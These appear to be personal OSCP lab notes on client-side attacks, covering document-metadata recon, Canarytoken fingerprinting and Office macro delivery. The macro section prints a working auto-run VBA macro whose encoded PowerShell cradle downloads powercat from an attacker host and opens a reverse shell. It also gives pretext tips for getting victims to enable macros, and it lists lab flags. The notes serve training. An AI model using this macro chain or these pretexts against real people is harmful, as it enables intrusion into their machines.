# Module 12: Client-Side Attacks

## Tags
#OSCP #Module12 #ClientSideAttacks #SocialEngineering #Reconnaissance #MetadataAnalysis

---

## **Why This Module Matters**
Straight-up exploiting an exposed service to breach a perimeter has gotten harder and rarer, Verizon's own breach report ranks phishing as the #2 attack vector, right behind credential attacks. Client-side attacks are the technical half of that story: get a malicious file in front of a user, get them to open it, land a foothold on a machine that (unlike a public-facing server) was never designed to be reachable from outside at all.

The core idea: client machines inside an org almost never expose services externally, so you can't port-scan your way in. Instead you exploit weaknesses in whatever software the *user* runs locally (browser, OS components, Office), and you need the user to cooperate (even unknowingly) to trigger it. That makes this as much a psychology problem as a technical one, matching everything covered in [[Phishing Basics]] about pretext and trust, just paired with a different payload category here (documents and library files instead of cloned login pages).

**Worth sitting with for a second:** this module explicitly calls out the ethical line, the goal is code execution, not blackmail, not impersonating law enforcement, not psychologically harming anyone. Same spirit as the "do not target" list mentioned in [[Phishing Basics#11.1.1. Email Phishing|11.1.1]], real engagements have real boundaries.

This module covers target reconnaissance for client-side attacks (12.1), exploiting Microsoft Office (12.2), and abusing Windows Library files (12.3).

**⚠️ Status:** 12.1 fully done. 12.2.1 done (theory + all 3 quiz answers). 12.2.2 done (Office installed, program list confirmed). 12.2.3 **fully done now**, both labs. Lab 1 (OFFICE macro → reverse shell) rebuilt twice across two fresh instances, both times working. Lab 2 (deliver to TICKETS, catch Administrator shell) finally cracked on the second resume: root cause of the repeated failures was never the VM/watcher-script, it was saving the Word doc as `.docx` instead of `.doc` both times (macros silently don't persist on `.docx` save, but still *appear* to work if tested live in the same session). Fixed, verified via a genuine cold reopen, delivered clean. Flag: `OS{cc21bba975986a21e782fffa572ded55}`. 12.3 (Windows library files): Lab 1 (HR137 delivery) and Lab 2 (MOTW true/false, confirmed **True**, `ZoneId=3`/Internet zone) both done on VM Group 1, first try, clean run, no VM issues this time. Lab 3 (ADMIN capstone) **blocked**, thoroughly enumerated across two independent fresh reverts (SMB, RPC null, WinRM x2 transports x2 formats, SMTP, POP3, IIS x2 wordlists + vhost checks, VM #3 local sweep, all ruled out), full trail logged below, recommend checking Offsec's own module hints before resuming. 12.4 Wrapping Up done.

---

## 12.1. Target Reconnaissance

### 12.1.1. Information Gathering

**The core constraint:** unlike normal network recon, you usually have no direct connection to a client-side attack's actual target (a specific employee's workstation). So you're forced into more indirect, creative info-gathering, and a genuinely nice side effect is that a lot of these techniques are completely passive: no packets ever touch the target, no logs, no alerts.

**Document metadata is the headline technique here.** Public documents (PDFs, Office files) an organization has posted online often carry metadata that was never scrubbed: author name, creation/modification dates, and critically, the exact software (and often OS) used to create the file. None of this requires touching the target's network at all, just downloading something they already published.

**Finding the documents:**
- Google dorking: `site:example.com filetype:pdf` (narrow further with keywords for a specific branch/location), reusing the dorking technique from [[Information Gathering]] (Module 6)
- `gobuster` with `-x pdf` (or whatever extension) against the target's own site, works but is noisy, it'll show up in the target's access logs unlike the passive Google-dork approach
- Just browsing the site by hand and looking for anything downloadable

**Reading the metadata with `exiftool`:**
```bash
exiftool -a -u brochure.pdf
```
`-a` shows duplicate tags (the same info sometimes appears under multiple tag names), `-u` shows "unknown" tags exiftool doesn't have a friendly label for but still extracts.

**What actually matters in the output:**
- **Create Date / Modify Date**: tells you how *current* this intel actually is. A document from last month is a much better signal than one from five years ago, software changes, people change roles, whole departments get re-imaged onto new systems.
- **Author**: a real name at the target org. Beyond just being a research thread to pull on, casually referencing someone's name in a pretext (an email, a phone call) is a small but real trust-builder, "I was just talking to Stanley about this" lands very differently than a cold approach.
- **Producer / Creator Tool**: this is the big one for planning an actual payload. `Microsoft® PowerPoint® for Microsoft 365` tells you Office is installed, no "for Mac" or "macOS" mentioned anywhere in the tags is a solid (not certain) signal the creating machine was Windows.

That combination (Office installed, likely Windows) is exactly the intel that decides which client-side attack vector makes sense next: JScript via Windows Script Host, malicious `.lnk` shortcut files, or Office macro documents, all covered later in this module.

**Worth remembering: this is a hands-off, best-effort technique, not a certainty.** The trade-off for staying invisible is that the intel might be stale, or a different branch of the org might run completely different software. Treat it as a strong lead, not a confirmed fact.


> 📋 Generalized copy-pasteable commands: [[Reconnaissance & Enumeration#Exiftool (Document Metadata Analysis)|Command Appendix]]
> 🧭 Quick lookup: [[Reconnaissance & Enumeration (Decision Tree)|Decision Tree]]

#### Tags: #MetadataAnalysis #Exiftool #GoogleDorking #PassiveRecon #OSINT

---

## Labs

### Lab 1 (VM #1): `old.pdf` metadata
> 🔧 Technique: the site's own download buttons (Single Page Application) turned out unreliable, brute forced for PDF files directly instead of fighting the UI.

Target: `192.168.170.197`.

**Step 1: Brute force for PDF files instead of using the site's buttons**
```bash
gobuster dir -u http://192.168.170.197/ -w /usr/share/wordlists/dirb/common.txt -x pdf -t 50
```
Found three PDFs: `brochure.pdf`, `info.pdf` (not mentioned anywhere in the module text), and `old.pdf`.
![[Pasted image 20260804221920.png]]
**Step 2: Grab and inspect `old.pdf`**
```bash
wget http://192.168.170.197/old.pdf
exiftool -a -u old.pdf
```
`Author` tag directly contains the flag (this one didn't need interpreting, unlike `brochure.pdf`'s "infer the OS/Office version" exercise in the module's own walkthrough). Also worth noting the `Producer` tag here: `macOS Version 12.3.1 (Build 21E258) Quartz PDFContext`, unlike `brochure.pdf`'s Windows/Microsoft 365 producer string, a good concrete example of the module's point that different documents (or branches of an org) can reveal different source machines.

**Lab answer:** **`OS{cc0f095a0c6485124055b709de810660}`**

![[Pasted image 20260804222011.png]]

#### Tags: #Lab #Quiz #Module12 #Exiftool #Gobuster

---

### Lab 2 (VM #2): flag in a third PDF's metadata
> 🔧 Technique: same site, same gobuster approach, this time the flag sits in a different metadata field entirely.

Target: `192.168.170.197` (same IP as VM #1 this time).

```bash
gobuster dir -u http://192.168.170.197/ -w /usr/share/wordlists/dirb/common.txt -x pdf -t 50
wget http://192.168.170.197/info.pdf
exiftool -a -u info.pdf
```
Flag was in the **`Description`** tag this time, not `Author` (where it sat for `old.pdf` in Lab 1). Worth remembering: don't assume the flag/interesting data always lands in the same field, `exiftool -a -u` dumping everything (including "unknown" tags) is exactly why that's the right default, rather than grepping for one specific tag name upfront.

Side note while re-pulling `brochure.pdf` here: `Language` showed as `de-DE` (German) this run, vs. `en-US` in the module's own walkthrough example, same file/producer otherwise, a small reminder that even "the same" lab asset can vary slightly instance to instance.

**Lab answer:** **`OS{545c2f90e45496106cea49766bc7538c}`**

#### Tags: #Lab #Quiz #Module12 #Exiftool #Gobuster

---

### 12.1.2. Client Fingerprinting

Metadata analysis (12.1.1) is entirely passive but also a bit of a guess, it tells you what created a document once, not what the target is running *right now*. Client fingerprinting closes that gap: get the target to interact with something you control, and their browser hands you live OS/browser info directly.

**Worked example scenario:** you've already got a target's email (say, via theHarvester from [[Information Gathering]]). The end goal is an HTA (HTML Application) attachment, a genuinely popular real-world foothold technique (threat actors and ransomware groups use it too, not just pentesters) that executes code in the context of Internet Explorer/Edge. But that only works if the target is actually on **Windows** with IE/Edge available, so confirming that *before* sending a payload that only works on the right platform is the whole point of this section.

**The tool: Canarytokens** (canarytokens.org), a free service that generates a tracking link. When a target opens it, you get their IP, browser, and OS, no payload delivered, no code execution, just a blank page and a logged visit.

**Pretext still matters here, same as always.** You can't just send a stranger a bare tracking link and expect a click. The module's example: pretend to be following up about an invoice with a supposed error, and offer a "screenshot showing the error" (which is actually the Canarytoken link). Framed around something specific to the target's actual job (finance department, an invoice) rather than a generic "click this" ask.

**Building and reading a Canarytoken:**
1. On canarytokens.org, pick **Web bug / URL token** from the dropdown, provide an email (or webhook) for alerts, add a comment for your own reference, generate it.
2. You get a tracking link plus a **Manage this token** page (settings) and a **History** page (visitor log, empty until someone clicks).
3. Once "the victim" opens the link: blank page on their end, a new entry appears in your History almost immediately, complete with a rough geographic location on a map.
4. Click into an entry for the full detail: **User-Agent string** (self-reported by the browser, tells you OS/browser, but spoofable, don't fully trust it alone) plus **JavaScript-fingerprinting-derived info** (collected by JS running on the Canarytoken page itself, meaningfully more reliable since it's actively probing the browser's real environment rather than just reading a header the browser chose to send).
5. Downloadable as CSV or JSON if you want it outside the dashboard.

**Other Canarytokens flavors worth knowing exist:** embed a token in a Word doc or PDF (fires when opened, not just when a link is clicked) or an image (fires when viewed). Alternatives to Canarytokens entirely: **Grabify** (another IP logger) or **fingerprint.js** (a JS fingerprinting library you could self-host if you wanted more control than a third-party service gives you).

**The payoff, and why this step can redirect your whole plan:** in the module's own example, the fingerprint comes back as Chrome on macOS, not Windows/IE/Edge at all. That's not a failure, that's the recon step doing its job: now you know the HTA-via-IE plan won't work on this specific target, and you either pick a different client-side vector entirely or adjust the pretext (e.g. claim the screenshot "only renders correctly in Internet Explorer" to nudge them toward opening it in the browser you actually need).

![[Pasted image 20260804222923.png]]
![[Pasted image 20260804223329.png]]
![[Pasted image 20260804223704.png]]
![[Pasted image 20260804223939.png]]
![[Pasted image 20260804224005.png]]

> 📋 Generalized reference: [[Reconnaissance & Enumeration#Canarytokens (Client Fingerprinting)|Command Appendix]]
> 🧭 Quick lookup: [[Reconnaissance & Enumeration (Decision Tree)|Decision Tree]]

#### Tags: #ClientFingerprinting #Canarytokens #DeviceFingerprinting #UserAgent #PretextBuilding

---

## 12.2. Exploiting Microsoft Office

Ransomware's initial breach is very often a malicious Office macro, Office is everywhere and Office documents fly between colleagues constantly, which is exactly why it's stayed a top attack vector for so long.

### 12.2.1. Preparing the Attack

**Three things to think through before building the actual malicious document:**

**1. Delivery method.** Malicious macros are well-known enough that a lot of email providers/spam filters just strip Office attachments outright, and most anti-phishing training specifically warns people about enabling macros in emailed documents. So a direct email attachment is often a dead end, a pretext pointing to a download link (matching everything in [[Phishing Basics]]) is frequently the more workable path.

**2. Mark of the Web + Protected View.** Any document that made it to the target via email or a download carries **MOTW** (same NTFS-attribute mechanism covered conceptually in [[Phishing Basics#11.2.2. Identifying Risks of Malicious Office Macros|11.2.2]] for other file types). A MOTW-tagged Office doc opens in **Protected View**: read-only, no macros, no embedded objects, until the user clicks **Enable Editing**. So the pretext has to specifically sell that click, e.g. blurring the rest of the document and instructing the target to click the button to "unlock" it. Alternative: target a macro-capable Office app that doesn't have Protected View at all, like Publisher, though it's installed far less often than Word/Excel.

**3. Microsoft's macro-blocking-by-default change.** Rolled out across Office 2013 through 2021 (exact timing varies by update channel, per Microsoft Learn). Before: a MOTW document with macros showed an **Enable Content** button, one click and you're running code. After: that button is gone, replaced with a **Learn More** link pointing to a Microsoft page explaining the danger, and the *only* way to actually run the macro is to manually open the file's Properties and tick **Unblock**. Meaningfully more friction, the pretext now has to walk the target through that specific multi-step process, not just "click here."

**The bigger picture, worth sitting with:** every one of these mitigations exists because macros work well enough that Microsoft had to keep responding. That's the attacker/defender arms race in miniature, each new control is something to route around, not a wall that ends the technique. Macro-based attacks are still genuinely common today despite all three of the above.

![[Pasted image 20260804224925.png]]

![[Pasted image 20260804224949.png]]

**Lab status: ✅ Completed:**

| Question | Answer |
|---|---|
| True or false: MOTW is not added to files on FAT32-formatted devices. | **True.** MOTW is implemented as an NTFS Alternate Data Stream (`Zone.Identifier`), and FAT32 doesn't support Alternate Data Streams at all, there's no mechanism for the tag to attach to in the first place. |
| True or false: after Microsoft's default-macro-blocking change, users can still execute macros with a single click. | **False.** Per 12.2.1 above, the one-click **Enable Content** button is gone for internet-delivered files, replaced by a **Learn More** link, actually running the macro now requires manually unblocking the file via its Properties dialog first. |
| True or false: it's possible to avoid a MOTW flag by delivering the payload in a container format (7zip, ISO, IMG), and real threat actors use this. | **True**, on both counts, verified via [MITRE ATT&CK T1553.005](https://attack.mitre.org/techniques/T1553/005/) and [Red Canary's Threat Detection Report](https://redcanary.com/threat-detection-report/techniques/mark-of-the-web-bypass/). ISO/IMG/VHD formats don't use NTFS internally, so the MOTW Alternate Data Stream has nothing to propagate onto for files extracted/mounted from them. Real, heavily documented technique: APT29 has embedded ISO/VHDX in HTML attachments, TA505 has delivered `.lnk` files inside `.iso` containers, QakBot operators packaged malware in ISO files to support Black Basta ransomware campaigns. **Caveat worth flagging:** Microsoft has since patched this specifically for ISO files (MOTW now propagates correctly from mounted ISOs on patched systems), so treat this as "historically true and still relevant for other container formats / unpatched systems," not "universally true forever," always verify current patch behavior against the actual target's Windows build rather than assuming. |

#### Tags: #MOTW #ProtectedView #MacroBlocking #Lab #Quiz #Module12

---

### 12.2.2. Installing Microsoft Office
> 🔧 Technique: RDP into a non-domain-joined Windows 11 box with `xfreerdp` (not `rdesktop`, NLA requires it), mount and run the Office 2019 installer, work through first-launch popups.

Target: `192.168.170.196`, `offsec`/`lab`.

**Step 1: RDP in**
```bash
xfreerdp /v:192.168.170.196 /u:offsec /p:lab /dynamic-resolution
```
`rdesktop` won't connect here, OFFICE is not domain-joined and Windows 11 has Network Level Authentication (NLA) on by default, `xfreerdp` supports NLA against non-domain-joined machines, `rdesktop` doesn't.

**Step 2: Install Office**
Mounted `C:\tools\Office2019.img` as a virtual CD (double-click → Open), ran `Setup.exe` from the mounted drive. Once installed: closed the splash screen, opened Word, dismissed the product key popup (X, starts the 7-day trial instead of activating), accepted the license agreement, declined optional data sharing in the privacy prompt.
![[Pasted image 20260804225745.png]]

**Step 3: Confirm installed programs**
Checked the Start menu for the full Office 2019 program list: Word, Excel, Outlook, PowerPoint, Publisher, Access, OneNote, plus two non-app utilities (Get Help, Office Language Preferences) that don't count as standalone programs.

**Lab answer:** **OneNote**

---

### 12.2.3. Leveraging Microsoft Word Macros

#### Lab 1 (VM #1, OFFICE): macro → reverse shell
> 🔧 Technique: VBA macro using `CreateObject("Wscript.Shell").Run` to launch a base64-encoded (UTF-16LE) PowerShell download cradle for PowerCat, split into ≤255-character chunks (VBA's literal string length limit) concatenated into a `Str` variable.

**Step 1: Basic proof-of-concept macro**

Created `mymacro.doc` (must be `.doc` or `.docm`, **not** `.docx`, which can run a macro in-session but can't persist/embed one in the saved file). Built the macro via **View → Macros**, name `MyMacro`, "Macros in" set to the document itself (not the global template, or it won't travel with the file):
```vba
Sub AutoOpen()
  MyMacro
End Sub

Sub Document_Open()
  MyMacro
End Sub

Sub MyMacro()
  CreateObject("Wscript.Shell").Run "powershell"
End Sub
```
`AutoOpen`/`Document_Open` both call the macro since they cover slightly different document-opening scenarios, using both is the safe default. Saved, closed, reopened, clicked **Enable Content** on the security warning, confirmed a PowerShell window popped up.

**Step 2: Full reverse shell payload**

Hosted `powercat.ps1` from `~` via `python3 -m http.server 80`, started `nc -nvlp 4444`. Built and base64-encoded (UTF-16LE, same requirement as [[Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]]'s PowerShell reverse shell) the download cradle via `pwsh`:
```powershell
$Text = 'IEX(New-Object System.Net.WebClient).DownloadString(''http://192.168.45.212/powercat.ps1'');powercat -c 192.168.45.212 -p 4444 -e powershell'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText = [Convert]::ToBase64String($Bytes)
```
Split into 50-character chunks (a small Python one-liner loop) since VBA can't hold the whole base64 string as one literal, then dropped into the macro:
```vba
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String

    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
    Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
    Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
    Str = Str + "hAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5A"
    Str = Str + "DIALgAxADYAOAAuADQANQAuADIAMQAyAC8AcABvAHcAZQByAGM"
    Str = Str + "AYQB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAAL"
    Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQAyACAALQB"
    Str = Str + "wACAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsA"
    Str = Str + "GwA"

    CreateObject("Wscript.Shell").Run Str
End Sub
```
Saved, closed, reopened, no re-prompt this time (only re-prompts if the filename changes), macro fired automatically. Web server logged the `GET /powercat.ps1`, listener caught the reverse shell.
![[Pasted image 20260804232757.png]]

**Question:** what keyword declares a variable in VBA?

**Lab answer:** **`Dim`**

> ⚡ **Modern tool:** [[MacroPack]] automates the exact generation-and-chunking process just done by hand above (VBA skeleton, base64 UTF-16LE cradle, `Str = Str +` chunking), plus adds AV-evasion obfuscation the manual approach doesn't attempt. Worth building it by hand once first, per this section, before reaching for the generator.

#### Tags: #Lab #Quiz #Module12 #VBA #WordMacros #PowerCat #ReverseShell

---

#### 🔁 Lab 1 Rebuild (fresh instance, after prior OFFICE VM corruption)

The original OFFICE instance broke beyond repair (see the Lab 2 troubleshooting saga below for the full story). Spinning up a brand-new instance gave **new IPs** and reset OFFICE back to bare Windows (no Office installed at all), so the whole chain had to be rebuilt from scratch. Logged granularly here specifically so this doesn't need re-deriving from memory next time.

**New instance IPs (check the lab panel each fresh spin-up, these change every time):**
- OFFICE (VM #1): `192.168.243.196`, `offsec` / `lab`
- TICKETS (VM #2): `192.168.243.198`, no direct login (never RDP into this one, it's driven entirely by the simulated-user script)

**Step 1: RDP in, confirm actual state before assuming anything**
```bash
xfreerdp /v:192.168.243.196 /u:offsec /p:lab /dynamic-resolution
```
*Found: Office not installed (Start menu has no Office apps), but `C:\tools\Office2019.img` still present. Confirms a full state wipe, not a partial/corrupted install this time.*

**Step 2: Mount the installer image**
Double-click `C:\tools\Office2019.img` in File Explorer. *Mounts as a new drive letter (`D:`), auto-launched `Setup.exe` from the mounted drive on this instance.*

**Step 3: Let the install finish**
No errors, installer window closed cleanly on completion (a few minutes).

**Step 4: Clear Word's first-launch prompts**
Open **Word** → dismiss the product key popup with **X** (starts 7-day trial, no need to activate) → accept the license agreement → decline optional data sharing.

**Step 5: Create and save the document in macro-capable format**
**File → Save As** → name `mymacro` → file type **Word 97-2003 Document (*.doc)** → Save. *`.docx` can run a macro in-session but can't persist one on save, has to be `.doc`/`.docm`.*

**Step 6 (Kali): confirm your current VPN IP**
```bash
ip a show tun0
```
*Don't assume it's unchanged from last session, per the module's own earlier note about this shifting after a VPN reconnect. This session: `192.168.45.179`.*

**Step 7 (Kali): host PowerCat and start the listener, two separate terminals**
```bash
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 ~
cd ~
python3 -m http.server 80
```
```bash
nc -nvlp 4444
```

**Step 8 (Kali): generate the base64-encoded (UTF-16LE) download cradle**
```bash
pwsh
```
```powershell
$Text = 'IEX(New-Object System.Net.WebClient).DownloadString(''http://192.168.45.179/powercat.ps1'');powercat -c 192.168.45.179 -p 4444 -e powershell'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText = [Convert]::ToBase64String($Bytes)
$EncodedText
```
*Same UTF-16LE-then-base64 requirement `powershell -enc` expects, matches [[Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]]'s PowerShell reverse shell.*

**Step 9 (Kali): chunk the payload into VBA-ready lines mechanically, not by hand**
```bash
b64='<paste $EncodedText output here>'
python3 -c "
s = 'powershell.exe -nop -w hidden -enc ' + '$b64'
for i in range(0, len(s), 50):
    print(f'    Str = Str + \"{s[i:i+50]}\"')
"
```
*Generating the split programmatically rather than manually cutting the string at 50-char intervals avoids fat-fingering a chunk boundary, same mechanical-extraction principle as [[Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2]]'s curl+sed key extraction lesson. Output is ready to paste straight into the VBA editor, no manual editing needed.*

**Step 10: Build the macro in Word's VBA editor**
**View → Macros → View Macros** (`Alt+F8`) → name `MyMacro` → **Macros in**: `mymacro.doc (document)`, **not** `Normal.dotm` → **Create**. *If Word prompts "already exists, replace?" (seen this session, likely just Word's own placeholder stub for the name), click **Yes**.*

Replace the skeleton with:
```vba
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String

    Str = Str + "<chunk 1 from Step 9's output>"
    Str = Str + "<chunk 2>"
    ' ...all chunks in order...

    CreateObject("Wscript.Shell").Run Str
End Sub
```

**Step 11: Save, close, reopen to trigger**
Close the VBA editor → `Ctrl+S` (keep `.doc`) → close Word → double-click `mymacro.doc` in File Explorer to reopen → click **Enable Content** if the security bar appears.

> **🛠️ Troubleshooting hit this session: first reopen produced no security bar and no autorun at all.**
> Trust Center was confirmed set to the normal default ("Disable all macros with notification"), which should always show the yellow warning bar for a document containing macros. Instead: nothing, silent no-op.
>
> Manually running it via the Macros dialog (**View → Macros → select MyMacro → Run**) worked immediately and caught a shell fine. So the payload itself was never the problem.
>
> On a later retry, just reopening the file the normal way (double-click) worked correctly. Bar appeared (or ran silently as trusted), macro fired, shell caught. Root cause never fully pinned down, most likely an RDP-session redraw glitch on the first open, not a real Trust Center/VBA-scoping issue. (The code structure itself, `AutoOpen`/`Document_Open` both calling `MyMacro`, all in the document's own module, is the same shape that already worked in the original Lab 1 session.)
>
> **Takeaway:** if a freshly-saved macro doc doesn't fire on first reopen, don't assume the macro is broken. Verify via the Macros dialog first, that isolates payload-correctness from open-triggering, then just try reopening again before rewriting anything.

**Step 12: Confirm the shell**
```
whoami
```
*Result: `offsec`, matching the RDP session's own logged-in user context, as expected.*

#### Tags: #Lab1Rebuild #FreshInstance #VBA #WordMacros #PowerCat #TrustCenter #FlakyAutorun

---

#### Lab 2 (VM #2, TICKETS): delivering the macro to a simulated user
> 🔧 Technique: blocked twice now, for two *different* reasons across two separate sessions. First on a corrupted OFFICE instance (resolved by reverting/rebuilding, see [[Client-Side Attacks#🔁 Lab 1 Rebuild (fresh instance, after prior OFFICE VM corruption)|Lab 1 Rebuild]] above), now on TICKETS' own trigger automation not firing. Full plan, exact wording, and granular troubleshooting trail below so this doesn't need re-deriving.

**Exact task wording (from the Offsec walkthrough itself, worth quoting verbatim since assumptions about it already cost one wasted attempt this session):**
> "Once you have confirmed that the macro from the previous exercise works, upload the document containing the macro MyMacro in the file upload form (port 8000) of the TICKETS (VM #2) machine with the name `ticket.doc`. A script on the machine, simulating a user, checks for this file and executes it. After receiving a reverse shell, enter the flag from the flag.txt file on the desktop for the Administrator user. For the file upload functionality, add tickets.com with the corresponding IP address in /etc/hosts. Please note that it can take up to three minutes after uploading the document for the macro to get executed."

**Key hard requirements confirmed from that wording, easy to get wrong:**
- Port is **8000**, not 80 (confirmed both in the module text and by directly enumerating the target, matches).
- Uploaded filename must be **exactly `ticket.doc`**, nothing else. (Wasted one troubleshooting cycle this session testing `ticket2.doc` to rule out a same-filename-ignored theory. Invalid test, the watcher isn't looking for that name at all.)
- Wait window is **up to 3 minutes** per attempt.

**The plan:**
1. Rebuild/confirm the macro on OFFICE (VM #1), same VBA payload as Lab 1 (done, see rebuild section above)
2. Copy the resulting `.doc` off the VM via an RDP redirected drive
3. Rename it to `ticket.doc` exactly, upload to TICKETS via the confirmed form
4. Wait up to ~3 minutes for the simulated-user script, catch a reverse shell as Administrator, read the flag from the desktop's `flag.txt`

**This session's granular attempt (fresh instance, OFFICE working fine this time):**

**Step 1: Fix the stale `/etc/hosts` entry**
```bash
grep tickets.com /etc/hosts
```
*Found a leftover line from the old IP range: `192.168.170.198 tickets.com`. Needed updating to this session's IP, not appending fresh (would've left a conflicting duplicate).*
```bash
sudo sed -i 's/192.168.170.198 tickets.com/192.168.243.198 tickets.com/' /etc/hosts
```
*Turned out there were actually **two** stale lines (both got fixed independently by the same sed, since sed processes each matching line). Left as two identical, both-correct lines rather than deduping, purely cosmetic, doesn't affect resolution (confirmed later via `getent hosts`).*

**Step 2: Confirm the upload form's exact field name**
```bash
curl -s http://tickets.com:8000/ | grep -iE "<form|<input|action="
```
*Confirmed: `action="http://tickets.com:8000/upload"`, field `name="myFile"`.*

**Step 3: Copy `mymacro.doc` off OFFICE via a redirected-drive RDP session**
```bash
xfreerdp /v:192.168.243.196 /u:offsec /p:lab /dynamic-resolution /drive:kali,/home/kali
```
*Opens a second RDP connection (separate from any session already holding a caught shell) with `/home/kali` mapped as a drive inside Windows (labelled `kali on kali` this session, wording varies by FreeRDP version). Copy-paste `mymacro.doc` from wherever it was saved (Desktop, this session) onto that mapped drive.*

**Step 4: Rename and upload**
```bash
cp ~/Desktop/mymacro.doc ~/Desktop/ticket.doc
curl -F "myFile=@$HOME/Desktop/ticket.doc" http://tickets.com:8000/upload
```
*Response: `Successfully Uploaded File: ticket.doc`.*

> **🛠️ Troubleshooting hit this session: multiple clean uploads of the correctly-named `ticket.doc`, listener confirmed healthy each time, nothing ever landed.**
> Ruled out, in order:
> - **Listener port conflict.** No, `nc -nvlp 4444` showed a clean `listening on [any] 4444` each time, no bind errors.
> - **Same-filename-ignored-on-reupload theory.** Tested by uploading as `ticket2.doc` instead. Invalid test in hindsight: the module's own wording confirms the watcher specifically checks for `ticket.doc`, so of course a different name never triggers it. Wasted a cycle, but confirmed the exact-filename requirement is real and load-bearing.
> - **Wrong IP / stale DNS.** Checked directly:
>   ```bash
>   getent hosts tickets.com
>   curl -v http://tickets.com:8000/ 2>&1 | head -15
>   ```
>   Both confirmed resolution and connection correctly hitting `192.168.243.198`, `200 OK` on a plain GET. Ruled out.
> - **Duplicate `/etc/hosts` lines causing some kind of split/round-robin behavior.** No, both lines are identical (same IP), so there's nothing to round-robin between. `/etc/hosts` is purely local to Kali anyway, it has zero bearing on how TICKETS' own internal script behaves.
>
> **Current leading theory (unconfirmed): the simulated-user watcher script is one-shot, not a repeating loop.** It likely watches for `ticket.doc` to appear, opens/executes it exactly once, then stops checking permanently, regardless of later re-uploads under the same name. The very first upload this session happened *before* the listener was actually running (mid-setup), so if the watcher fired on that first appearance and got no callback destination, it may have already "used up" its only execution and gone quiet for good. Matches [[Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]]'s repeated lesson about verifying every piece of infrastructure (listener *and* target) is actually ready before the trigger fires, not after.
> - **Fix to try on resume:** revert/restart the **TICKETS** instance specifically (not OFFICE this time) from the lab control panel, to reset whatever one-shot state it's tracking. Then, critically, **get the listener running and confirmed healthy *before* the very first upload**, so there's no wasted first shot to burn.

> **🔄 Correction (2026-08-06, next session): the one-shot-watcher theory above was very likely wrong.** Resumed on a fresh instance, rebuilt the macro, and hit a near-identical dead end again, upload succeeded, listener was healthy, nothing fired. Turned out the actual mistake, on both attempts, was saving the Word document as `.docx` instead of `.doc`. Word silently **strips macros entirely on save to `.docx`**, no warning, no error dialog, the file just quietly ends up with no code inside it. A macro built and tested live in the same Word session still *appears* to work (it's running from memory, not from the saved file), which is exactly what made this so easy to miss both times, the live test looked fine, only a genuine cold reopen (close Word fully, reopen from disk) exposes that the payload never actually persisted. Once re-saved correctly as `.doc` and verified via an actual cold reopen (not just the live-session trigger), delivery to TICKETS worked on the very next attempt, no VM revert needed, no filename-based one-shot theory required. **Lesson: verify `.doc`/`.docm` format explicitly before ever trusting a "it worked when I tested it" result for a macro delivery chain**, and don't fully trust an unconfirmed root-cause theory (like the one-shot watcher above) just because the cheaper explanations were checked, always keep "did I actually verify this survives a cold reopen" on the list.

**Step 7: Confirm privilege, navigate to the flag, read it**
```
whoami
cd C:\Users\Administrator\Desktop
dir
type flag.txt
```
```
PS C:\Users\Administrator\Pictures> whoami
tickets\administrator
PS C:\Users\Administrator\Pictures> cd C:\Users\Administrator\Desktop
PS C:\Users\Administrator\Desktop> dir

    Directory: C:\Users\Administrator\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          8/6/2026  12:20 PM             38 flag.txt

PS C:\Users\Administrator\Desktop> type flag.txt
OS{cc21bba975986a21e782fffa572ded55}
```
*`whoami` confirmed `tickets\administrator` before even navigating anywhere, callback landed with full admin privilege straight away, no privesc needed. The shell landed in `C:\Users\Administrator\Pictures` (working directory inherited from wherever the delivered process happened to spawn), one `cd` away from the actual Desktop.*

**Lab answer:** **`OS{cc21bba975986a21e782fffa572ded55}`**, `tickets\administrator`, flag on the Administrator desktop. ✅ Done.

---

## Labs (continued)

### Lab 3: AdBlocker's effect on fingerprinting accuracy
> 🔧 Technique: created a Web bug / URL Canarytoken, opened the link twice (AdBlocker on, then off), compared the History entries.

**Question:** true or false, there's no difference in the results between AdBlocker enabled vs disabled?

**Lab answer:** **False.** There IS a difference. Makes sense given how the detailed fingerprint data actually gets collected: the *reliable* half of a Canarytoken's info (the part beyond the raw, spoofable User-Agent string) comes from **JavaScript actively running in the browser** to probe its real environment. AdBlockers commonly block tracking/fingerprinting scripts as part of their normal job, so with one enabled, that JS either doesn't run at all or gets a reduced picture. Thinner/different result than the same link opened with no blocker in the way.

**Practical takeaway for a real engagement:** a target running an AdBlocker (increasingly common) may give you a less complete fingerprint than expected, worth keeping in mind before fully trusting a single fingerprinting pass, especially if the result looks suspiciously sparse.

---

## 12.3. Abusing Windows Library Files

**Why this technique exists, and why macros alone aren't enough anymore.** Per [[Client-Side Attacks#12.2.1. Preparing the Attack|12.2.1]]'s own MOTW/macro-blocking coverage, Office macros are a well-worn enough vector that security products actively scan for them, Microsoft ships GPO templates specifically to lock them down, and most security-awareness training explicitly warns staff about them. That combination makes macros a genuinely hard sell on a hardened target. Windows library files (`.Library-ms`) are a lesser-known alternative that routes around all three defenses, not because the underlying idea is more sophisticated, but because almost nobody is looking for it.

> ℹ️ **GPO refresher, if needed:** Microsoft's own overview covers what a Group Policy Object actually is and how it's structured/replicated: [learn.microsoft.com/.../group-policy-overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/group-policy/group-policy-overview)

### 12.3.1. Obtaining code execution via Windows library files

